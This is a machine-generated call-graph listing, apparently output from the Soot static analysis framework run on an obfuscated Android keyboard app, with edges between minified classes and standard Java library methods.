VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <lid: int hashCode()>
INTERFACE edge: $z0 = interfaceinvoke $r2.<java.util.Set: boolean add(java.lang.Object)>($r1) in <ljf: boolean add(java.lang.Object)> ==> <java.util.HashSet: boolean add(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke r0.<java.lang.Object: void <init>()>() in <dwx: void <init>(int)> ==> <java.lang.Object: void <init>()>
SPECIAL edge: specialinvoke r0.<mij: void <init>(miy)>($r1) in <her: void <init>(miy)> ==> <mij: void <init>(miy)>
STATIC edge: $r3 = staticinvoke <lkq: lkq q()>() in <lmo: lqs G(java.util.Comparator)> ==> <lkq: lkq q()>
SPECIAL edge: specialinvoke r0.<java.io.InputStream: void <init>()>() in <bek: void <init>(java.nio.ByteBuffer)> ==> <java.io.InputStream: void <init>()>
SPECIAL edge: specialinvoke r0.<lqd: void <init>()>() in <lin: void <init>(ldp,lqd)> ==> <lqd: void <init>()>
VIRTUAL edge: virtualinvoke r0.<ljf: void h()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: void h()>
SPECIAL edge: specialinvoke $r0.<lpi: void <init>(java.lang.String,int)>("KEY", 0) in <lpi: void <clinit>()> ==> <lpi: void <init>(java.lang.String,int)>
VIRTUAL edge: virtualinvoke $r2.<ivv: void g(java.lang.String)>($r3) in <ivw: ivw d(java.util.Locale)> ==> <ivv: void g(java.lang.String)>
STATIC edge: staticinvoke <lri: void t(java.lang.Object,int)>($r3, $i3) in <lma: lma i(int,java.lang.Object[])> ==> <lri: void t(java.lang.Object,int)>
INTERFACE edge: $r5 = interfaceinvoke $r1.<java.util.Map: java.lang.Object get(java.lang.Object)>($r4) in <iej: void g(java.lang.String,iec)> ==> <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)>
VIRTUAL edge: $z0 = virtualinvoke $r2.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: virtualinvoke r0.<ljf: void l(int)>($i6) in <ljf: boolean add(java.lang.Object)> ==> <ljf: void l(int)>
SPECIAL edge: $i5 = specialinvoke r0.<ljf: int o(int,int,int,int)>($i4, $i5, $i3, $i0) in <ljf: boolean add(java.lang.Object)> ==> <ljf: int o(int,int,int,int)>
STATIC edge: $i6 = staticinvoke <izw: int aj(java.lang.Object,int)>($r7, $i5) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <izw: int aj(java.lang.Object,int)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r1) in <izw: boolean D(java.util.Collection,java.util.Iterator)> ==> <iye: java.lang.Object w(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<iec: void <init>()>() in <hns: void <init>()> ==> <iec: void <init>()>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Long: java.lang.Long valueOf(long)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<lid: void <init>()>() in <ljb: void <init>(ljd,int)> ==> <lid: void <init>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lma: lma i(int,java.lang.Object[])> ==> <java.lang.String: boolean equals(java.lang.Object)>
SPECIAL edge: $r11 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <ivv: ivw i(java.lang.String)>
VIRTUAL edge: $r5 = virtualinvoke $r2.<lts: java.lang.Object d(lsz)>($r3) in <lsd: boolean b(lsr)> ==> <lsm: java.lang.Object d(lsz)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(13) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
CLINIT edge: staticinvoke <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <j$.util.concurrent.ConcurrentHashMap: void <clinit>()>
VIRTUAL edge: $r5 = virtualinvoke $r19.<java.lang.ThreadLocal: java.lang.Object get()>() in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.ThreadLocal: java.lang.Object get()>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean containsAll(java.util.Collection)> ==> <lsb: java.lang.Object next()>
VIRTUAL edge: $r9 = virtualinvoke $r6.<lly: lma g()>() in <hbw: java.lang.Object a(java.lang.Object)> ==> <lly: lma g()>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r4) in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r1 = staticinvoke <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>($r2) in <gwk: void <init>()> ==> <java.util.Collections: java.util.Set newSetFromMap(java.util.Map)>
VIRTUAL edge: $r8 = virtualinvoke $r7.<lsc: lsw d()>() in <ivw: ivw d(java.util.Locale)> ==> <lsc: lsw d()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r6) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: $r0 = staticinvoke <lum: lvm i()>() in <lum: lvt k()> ==> <lum: lvm i()>
SPECIAL edge: specialinvoke $r5.<java.lang.AssertionError: void <init>(java.lang.Object)>("Couldn\'t find the Unsafe") in <j$.sun.misc.b: java.lang.reflect.Field i()> ==> <java.lang.AssertionError: void <init>(java.lang.Object)>
SPECIAL edge: specialinvoke r0.<llo: void <init>(lkx,int)>($r2, $i0) in <lme: void <init>(lkx,int)> ==> <llo: void <init>(lkx,int)>
SPECIAL edge: specialinvoke $r0.<java.lang.StringBuilder: void <init>()>() in <lri: void t(java.lang.Object,int)> ==> <java.lang.StringBuilder: void <init>()>
STATIC edge: $r2 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean u(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean u(char)>
SPECIAL edge: $r4 = specialinvoke r0.<ivv: ivw i(java.lang.String)>($r2) in <ivv: ivw a()> ==> <ivv: ivw i(java.lang.String)>
STATIC edge: staticinvoke <iwt: void g(char[],int,int)>($r4, $i2, 2) in <nzh: boolean f(ivv)> ==> <iwt: void g(char[],int,int)>
SPECIAL edge: specialinvoke $r3.<java.lang.NullPointerException: void <init>(java.lang.String)>("Null searchFeature") in <idq: void <init>(java.lang.String,mag)> ==> <java.lang.NullPointerException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: boolean isAssignableFrom(java.lang.Class)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
STATIC edge: $r1 = staticinvoke <ljd: ljd g()>() in <lli: void <init>()> ==> <ljd: ljd g()>
CLINIT edge: staticinvoke <ldr: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <ldr: void <clinit>()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Set: int size()>() in <lri: boolean j(java.util.Set,java.lang.Object)> ==> <lqr: int size()>
STATIC edge: $r5 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
SPECIAL edge: specialinvoke $r0.<coo: void <init>(int)>(20) in <coo: void <clinit>()> ==> <coo: void <init>(int)>
VIRTUAL edge: $i1 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lvt: int hashCode()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r2) in <lqq: java.lang.Object t(java.lang.Object,java.lang.Object[],int,int,java.lang.Object)> ==> <java.lang.String: boolean equals(java.lang.Object)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c2) in <ivw: boolean B(java.lang.String)> ==> <ivw: boolean x(char)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.Class: java.lang.String getName()> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: java.lang.Object[] toArray(java.lang.Object[])>($r1) in <lkh: java.lang.Object[] toArray()> ==> <lkh: java.lang.Object[] toArray(java.lang.Object[])>
SPECIAL edge: specialinvoke $r7.<lvq: void <init>(lvr,int)>(r0, $i0) in <lvr: void <init>(java.util.List)> ==> <lvq: void <init>(lvr,int)>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(3) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
CLINIT edge: staticinvoke <iwt: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <iwt: void <clinit>()>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <llg: boolean hasNext()>
SPECIAL edge: specialinvoke $r1.<ljf: void <init>()>() in <lmb: java.util.Collection b()> ==> <ljf: void <init>()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getKey()>() in <lid: boolean equals(java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
SPECIAL edge: specialinvoke $r6.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r5) in <nzh: boolean f(ivv)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>($r2, "metadata key") in <lsn: void q(lsz,java.lang.Object)> ==> <lvm: java.lang.Object g(java.lang.Object,java.lang.String)>
INTERFACE edge: $r2 = interfaceinvoke $r3.<java.util.List: java.lang.Object get(int)>($i1) in <hbw: java.lang.Object a(java.lang.Object)> ==> <lql: java.lang.Object get(int)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r2, $r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
STATIC edge: staticinvoke <iye: java.lang.Object w(java.lang.Object)>($r3) in <lqc: int compare(java.lang.Object,java.lang.Object)> ==> <iye: java.lang.Object w(java.lang.Object)>
STATIC edge: $r2 = staticinvoke <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>($r3, $r2) in <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)> ==> <j$.util.concurrent.r: j$.util.concurrent.s c(j$.util.concurrent.s,j$.util.concurrent.s)>
INTERFACE edge: $r8 = interfaceinvoke $r6.<java.util.Iterator: java.lang.Object next()>() in <lqs: boolean equals(java.lang.Object)> ==> <lje: java.lang.Object next()>
SPECIAL edge: $r2 = specialinvoke r0.<ljf: java.lang.Object p()>() in <ljf: int o(int,int,int,int)> ==> <ljf: java.lang.Object p()>
STATIC edge: $i6 = staticinvoke <izw: int ag(int,int,int)>($i7, $i8, $i4) in <ljd: int z(int,int,int,int)> ==> <izw: int ag(int,int,int)>
STATIC edge: $z0 = staticinvoke <kzs: boolean d(java.lang.Object,java.lang.Object)>($r1, $r3) in <lid: boolean equals(java.lang.Object)> ==> <kzs: boolean d(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>($r1, $i0, $i1, $r2) in <j$.util.concurrent.d: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)> ==> <j$.util.concurrent.a: void <init>(j$.util.concurrent.l[],int,int,j$.util.concurrent.ConcurrentHashMap)>
INTERFACE edge: interfaceinvoke $r2.<java.util.List: boolean add(java.lang.Object)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.util.ArrayList: boolean add(java.lang.Object)>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 97, 122, $i0) in <iwt: java.lang.String e(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
CLINIT edge: staticinvoke <jsg: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <jsg: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r1.<java.lang.Object: boolean equals(java.lang.Object)>($r5) in <j$.util.concurrent.ConcurrentHashMap: java.lang.Object get(java.lang.Object)> ==> <lta: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalStateException: void <init>(java.lang.String)>($r2) in <iye: void I(boolean,java.lang.Object)> ==> <java.lang.IllegalStateException: void <init>(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r4.<nzh: boolean e()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: boolean e()>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("GifMetadata", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke r0.<lsc: void <init>(lto)>($r1) in <ltf: void <init>(lto)> ==> <lsc: void <init>(lto)>
SPECIAL edge: $i4 = specialinvoke r0.<ljf: int n()>() in <ljf: boolean add(java.lang.Object)> ==> <ljf: int n()>
STATIC edge: $r7 = staticinvoke <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>($r6) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.security.AccessController: java.lang.Object doPrivileged(java.security.PrivilegedAction)>
SPECIAL edge: specialinvoke r0.<lsq: void <init>()>() in <lso: void <init>()> ==> <lsq: void <init>()>
INTERFACE edge: $r7 = interfaceinvoke $r10.<java.util.Collection: java.util.Iterator iterator()>() in <lmb: lme f()> ==> <ljf: java.util.Iterator iterator()>
VIRTUAL edge: $i0 = virtualinvoke $r1.<java.lang.Object: int hashCode()>() in <lta: int hashCode()> ==> <lsp: int hashCode()>
VIRTUAL edge: $c1 = virtualinvoke $r0.<java.lang.String: char charAt(int)>(1) in <ivw: boolean F(java.lang.String)> ==> <java.lang.String: char charAt(int)>
STATIC edge: staticinvoke <lvm: void h(boolean,java.lang.String)>(1, "skipFrames must be >= 0") in <lwk: java.lang.StackTraceElement[] b(java.lang.Class,int)> ==> <lvm: void h(boolean,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String substring(int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<lkq: lsb B()>() in <lqo: lsa l()> ==> <lkq: lsb B()>
VIRTUAL edge: $r3 = virtualinvoke r0.<ljd: java.util.Map m()>() in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <ljd: java.util.Map m()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <lki: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(14) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
CLINIT edge: staticinvoke <java.lang.Double: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Double: void <clinit>()>
SPECIAL edge: specialinvoke $r8.<ivw: void <init>()>() in <ivw: void <clinit>()> ==> <ivw: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke $r1.<java.lang.String: java.lang.String concat(java.lang.String)>($r2) in <ivv: void e(java.lang.String)> ==> <java.lang.String: java.lang.String concat(java.lang.String)>
STATIC edge: $r1 = staticinvoke <idq: idq a(java.lang.String,mag)>("BitmojiImage", $r0) in <idq: void <clinit>()> ==> <idq: idq a(java.lang.String,mag)>
SPECIAL edge: specialinvoke $r12.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r7) in <ivv: ivw b(java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: $z0 = staticinvoke <ivw: boolean x(char)>($c4) in <ivv: ivw b(java.lang.String)> ==> <ivw: boolean x(char)>
STATIC edge: staticinvoke <izw: void an(java.lang.Object,int,int)>($r1, $i3, $i6) in <ljf: int o(int,int,int,int)> ==> <izw: void an(java.lang.Object,int,int)>
SPECIAL edge: specialinvoke r0.<lli: void e(java.lang.Object,java.lang.Object)>($r1, $r2) in <lmb: void g(java.lang.Object,java.lang.Object)> ==> <lli: void e(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke $r13.<java.lang.String: void <init>(char[],int,int)>($r3, $i0, $i1) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[],int,int)>
STATIC edge: staticinvoke <lri: void u(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lri: void u(java.lang.Object[])>
STATIC edge: $r3 = staticinvoke <java.lang.Integer: java.lang.Integer valueOf(int)>($i0) in <iye: void D(boolean,java.lang.String,int,int)> ==> <java.lang.Integer: java.lang.Integer valueOf(int)>
SPECIAL edge: specialinvoke $r4.<hnp: void <init>()>() in <hnt: void <clinit>()> ==> <hnp: void <init>()>
STATIC edge: $i5 = staticinvoke <izw: int ah(int)>($i4) in <ljf: boolean add(java.lang.Object)> ==> <izw: int ah(int)>
STATIC edge: $r3 = staticinvoke <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>($r3) in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <j$.util.Objects: java.lang.Object requireNonNull(java.lang.Object)>
VIRTUAL edge: $l0 = virtualinvoke r0.<j$.sun.misc.b: long k(java.lang.reflect.Field)>($r4) in <j$.sun.misc.b: long j(java.lang.Class,java.lang.String)> ==> <j$.sun.misc.b: long k(java.lang.reflect.Field)>
VIRTUAL edge: virtualinvoke $r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Resetting default value is disallowed [") in <hbv: void k(java.lang.Object,boolean)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r23.<j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>($r2) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.g: void <init>(j$.util.concurrent.l[])>
STATIC edge: $z0 = staticinvoke <ivw: boolean O(char)>($c3) in <ivw: boolean t(char[],int,int)> ==> <ivw: boolean O(char)>
SPECIAL edge: specialinvoke $r5.<java.util.concurrent.atomic.AtomicLong: void <init>(long)>($l0) in <j$.util.concurrent.ThreadLocalRandom: void <clinit>()> ==> <java.util.concurrent.atomic.AtomicLong: void <init>(long)>
SPECIAL edge: specialinvoke $r7.<java.lang.String: void <init>(char[])>($r3) in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: void <init>(char[])>
INTERFACE edge: $z0 = interfaceinvoke $r10.<java.util.Iterator: boolean hasNext()>() in <hbv: void j()> ==> <lnc: boolean hasNext()>
VIRTUAL edge: virtualinvoke $r30.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r3) in <lsn: void ab(java.lang.String,java.lang.Object[])> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r2.<llo: lsa F()>() in <lmc: lsa l()> ==> <llo: lsa F()>
SPECIAL edge: specialinvoke r0.<java.util.AbstractMap: void <init>()>() in <ljd: void <init>()> ==> <java.util.AbstractMap: void <init>()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lkh: int size()>() in <lkh: java.lang.Object[] toArray(java.lang.Object[])> ==> <lrg: int size()>
VIRTUAL edge: virtualinvoke $r0.<java.lang.StringBuilder: java.lang.StringBuilder append(char)>(46) in <lsc: void f(java.lang.String,ltn)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(char)>
SPECIAL edge: specialinvoke $r1.<llg: void <init>(llo)>(r0) in <llo: lsa F()> ==> <llg: void <init>(llo)>
SPECIAL edge: $i1 = specialinvoke r0.<ivv: int h()>() in <ivv: ivw a()> ==> <ivv: int h()>
INTERFACE edge: $r8 = interfaceinvoke $r9.<lse: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>("com/google/android/libraries/inputmethod/utils/LanguageTag", "extractLanguageAndCountryFromLocale", 260, "LanguageTag.java") in <ivw: ivw d(java.util.Locale)> ==> <lsn: lsw j(java.lang.String,java.lang.String,int,java.lang.String)>
VIRTUAL edge: $r3 = virtualinvoke r0.<ivw: java.lang.String p()>() in <ivw: boolean equals(java.lang.Object)> ==> <ivw: java.lang.String p()>
VIRTUAL edge: $i0 = virtualinvoke r0.<ljf: int c()>() in <ljf: java.util.Set f()> ==> <ljf: int c()>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>($r4, $r5) in <lqq: lqq r(int,java.lang.Object[],lkt)> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
SPECIAL edge: specialinvoke r0.<java.lang.ThreadLocal: void <init>()>() in <oru: void <init>()> ==> <java.lang.ThreadLocal: void <init>()>
VIRTUAL edge: $r2 = virtualinvoke r0.<ljf: java.util.Set g()>() in <ljf: java.lang.Object[] toArray()> ==> <ljf: java.util.Set g()>
SPECIAL edge: specialinvoke $r1.<lqn: void <init>(lkx,java.lang.Object[],int,int)>(r0, $r2, 0, $i0) in <lqq: lma f()> ==> <lqn: void <init>(lkx,java.lang.Object[],int,int)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lkh: lkq k()>() in <lqn: lsa l()> ==> <lma: lkq k()>
SPECIAL edge: specialinvoke $r2.<lqs: void <init>(lkq,java.util.Comparator)>($r3, $r0) in <lmo: lqs G(java.util.Comparator)> ==> <lqs: void <init>(lkq,java.util.Comparator)>
SPECIAL edge: specialinvoke $r0.<jlu: void <init>(int)>(1) in <jlu: void <clinit>()> ==> <jlu: void <init>(int)>
VIRTUAL edge: $z0 = virtualinvoke $r5.<java.lang.Object: boolean equals(java.lang.Object)>($r3) in <lsd: boolean b(lsr)> ==> <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)>
INTERFACE edge: $r2 = interfaceinvoke $r8.<java.util.Iterator: java.lang.Object next()>() in <j$.util.concurrent.ConcurrentHashMap: boolean equals(java.lang.Object)> ==> <j$.util.concurrent.d: java.lang.Object next()>
SPECIAL edge: specialinvoke $r1.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: void <init>(char[],int,int)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r25.<mag: void <init>(java.lang.String,int,int)>("TENOR_TRENDING_SEARCH_TERM_METADATA", 25, 25) in <mag: void <clinit>()> ==> <mag: void <init>(java.lang.String,int,int)>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(10) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r5.<java.util.ConcurrentModificationException: void <init>()>() in <qj: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.util.ConcurrentModificationException: void <init>()>
STATIC edge: $r3 = staticinvoke <lkq: lkq g(java.lang.Object[])>($r2) in <lkq: lkq A(java.util.Comparator,java.lang.Iterable)> ==> <lkq: lkq g(java.lang.Object[])>
STATIC edge: $r0 = staticinvoke <iwt: char[] s(java.lang.String,char,char,int)>($r1, 65, 90, 32) in <iwt: java.lang.String c(java.lang.String)> ==> <iwt: char[] s(java.lang.String,char,char,int)>
STATIC edge: $i0 = staticinvoke <lri: int b(java.util.Set)>(r0) in <lma: int hashCode()> ==> <lri: int b(java.util.Set)>
VIRTUAL edge: $r1 = virtualinvoke r0.<lrg: lsa l()>() in <lrg: java.util.Iterator iterator()> ==> <lrg: lsa l()>
VIRTUAL edge: $i6 = virtualinvoke $r2.<java.lang.Object: int hashCode()>() in <lqq: java.lang.Object u(java.lang.Object[],int,int,int)> ==> <java.util.AbstractMap$SimpleImmutableEntry: int hashCode()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(20) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
VIRTUAL edge: $r8 = virtualinvoke $r0.<androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>(null, $r6, "", $r7, "") in <dummyMainClass: androidx.core.content.FileProvider dummyMainMethod_androidx_core_content_FileProvider(android.content.Intent)> ==> <androidx.core.content.FileProvider: android.database.Cursor query(android.net.Uri,java.lang.String[],java.lang.String,java.lang.String[],java.lang.String)>
INTERFACE edge: $r1 = interfaceinvoke $r5.<java.util.Map$Entry: java.lang.Object getKey()>() in <jlu: int compare(java.lang.Object,java.lang.Object)> ==> <java.util.AbstractMap$SimpleImmutableEntry: java.lang.Object getKey()>
INTERFACE edge: $i0 = interfaceinvoke $r2.<java.util.Comparator: int compare(java.lang.Object,java.lang.Object)>($r3, $r1) in <lmo: int a(java.lang.Object,java.lang.Object)> ==> <lqc: int compare(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r2 = virtualinvoke r0.<lid: java.lang.Object getValue()>() in <lid: int hashCode()> ==> <ljb: java.lang.Object getValue()>
VIRTUAL edge: $i0 = virtualinvoke r0.<lqs: int size()>() in <lqs: boolean equals(java.lang.Object)> ==> <lqs: int size()>
INTERFACE edge: $r5 = interfaceinvoke $r6.<java.util.Map$Entry: java.lang.Object getValue()>() in <hbv: void j()> ==> <lki: java.lang.Object getValue()>
VIRTUAL edge: virtualinvoke $r9.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(", error index: ") in <ivv: ivw b(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.Object: boolean equals(java.lang.Object)>($r4) in <lri: boolean a(java.util.Comparator,java.lang.Iterable)> ==> <java.lang.Object: boolean equals(java.lang.Object)>
SPECIAL edge: specialinvoke $r21.<j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>($r18) in <j$.util.concurrent.ConcurrentHashMap: void o(j$.util.concurrent.l[],j$.util.concurrent.l[])> ==> <j$.util.concurrent.r: void <init>(j$.util.concurrent.s)>
STATIC edge: $r2 = staticinvoke <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>($r2, $i0) in <ljd: void t(int)> ==> <java.util.Arrays: java.lang.Object[] copyOf(java.lang.Object[],int)>
VIRTUAL edge: $i1 = virtualinvoke $r7.<java.lang.String: int length()>() in <ivv: ivw b(java.lang.String)> ==> <java.lang.String: int length()>
INTERFACE edge: $r3 = interfaceinvoke $r2.<java.util.Map$Entry: java.lang.Object getValue()>() in <lid: boolean equals(java.lang.Object)> ==> <ljb: java.lang.Object getValue()>
SPECIAL edge: specialinvoke $r0.<lso: void <init>()>() in <lsq: void <clinit>()> ==> <lso: void <init>()>
SPECIAL edge: specialinvoke $r0.<hbw: void <init>(int)>(15) in <hbw: void <clinit>()> ==> <hbw: void <init>(int)>
SPECIAL edge: specialinvoke $r1.<java.lang.IllegalArgumentException: void <init>(java.lang.String)>($r0) in <lvm: void h(boolean,java.lang.String)> ==> <java.lang.IllegalArgumentException: void <init>(java.lang.String)>
STATIC edge: staticinvoke <izw: void aq(java.lang.Object,java.lang.Object)>("ji", "yi") in <ivw: void <clinit>()> ==> <izw: void aq(java.lang.Object,java.lang.Object)>
VIRTUAL edge: $r3 = virtualinvoke $r1.<ljd: java.lang.Object h(int)>($i0) in <ljb: void a()> ==> <ljd: java.lang.Object h(int)>
CLINIT edge: staticinvoke <java.lang.Float: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <java.lang.Float: void <clinit>()>
VIRTUAL edge: $r7 = virtualinvoke $r4.<nzh: java.lang.String c()>() in <ivv: ivw b(java.lang.String)> ==> <nzh: java.lang.String c()>
INTERFACE edge: interfaceinvoke $r9.<lse: void F(java.lang.String,java.lang.Object,java.lang.Object)>("Locale %s has invalid variant: %s", $r0, $r3) in <ivw: ivw d(java.util.Locale)> ==> <lsn: void F(java.lang.String,java.lang.Object,java.lang.Object)>
CLINIT edge: staticinvoke <lwa: void <clinit>()>() in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <lwa: void <clinit>()>
VIRTUAL edge: $z0 = virtualinvoke $r0.<java.lang.String: boolean isEmpty()>() in <lsh: lsh j(java.lang.String)> ==> <java.lang.String: boolean isEmpty()>
VIRTUAL edge: $i1 = virtualinvoke $r7.<lsq: int a()>() in <lsc: void f(java.lang.String,ltn)> ==> <lso: int a()>
STATIC edge: $i6 = staticinvoke <java.lang.Math: int max(int,int)>(1, $i6) in <ljd: java.lang.Object put(java.lang.Object,java.lang.Object)> ==> <java.lang.Math: int max(int,int)>
